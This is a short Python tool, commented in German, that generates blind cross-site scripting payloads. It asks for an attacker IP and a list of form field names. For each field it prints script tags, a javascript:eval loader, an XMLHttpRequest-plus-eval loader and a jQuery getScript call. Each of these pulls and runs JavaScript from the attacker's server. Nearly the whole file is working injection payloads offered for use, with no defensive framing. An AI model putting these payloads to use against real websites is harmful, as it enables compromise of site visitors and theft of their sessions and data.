



# Hier fragen wir nach der Verwendung der Templates oder eines eigenen Payloads

print("Do you want to use the templates or use your own script?")
print("\n")
print("[1] = Templates")
print("[2] = Custom Script")
print("\n")

selection = int(input())

if selection != 1 and selection != 2:
    print("\n")
    print("Invalid selection. Exiting...")
    print("\n")
    exit()
elif selection == 1:
    print("\n")
    print("You selected: Templates")
    print("\n")
elif selection == 2:
    print("\n")
    print("You selected: Custom Script")
    print("\n")



# Hier fragen wir nach der Attacker IP

print("What is the attacker IP?")
attip= input()
print("\n")
print(f"Attacker IP: {attip}")
print("\n")


  
# Hier fragen wir nach den Input Fields

print("What are the names of the input Fields, separated by 'comma'?")
fields = input()
words = fields.split(",")
print("\n")



# Hier drucken wir die Template Payloads

if selection == 1:
    for field in words:
        print(f"<script src=http://{attip}/{field}></script>")
    print("\n")

    for field in words:
        print(f"'><script src=http://{attip}/{field}></script>")
    print("\n")  
    
    for field in words:
        print(f'"><script src=http://{attip}/{field}></script>')
    print("\n")

    for field in words:
        print(f"javascript:eval('var a=document.createElement(\'script\');a.src=\'http://{attip}/{field}\';document.body.appendChild(a)'")
    print("\n")
    
    for field in words:
        print('<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + f'{attip}/{field}");a.send();</script>')
    print("\n")

    for field in words:
        print(f'<script>$.getScript("http://{attip}/{field}")</script>')
    print("\n")

    exit()





# Hier drucken wie die Custom Payloads

if selection == 2:
    print("Please input your own script.\nPlease insert '{attip}' for the attacker IP and '{field}' for your custom field.\n")
    print("\n") 

script = str(input())

print("\n")
for field in words:
    print(script.replace('{attip}', attip).replace('{field}', field))
print("\n")
exit()

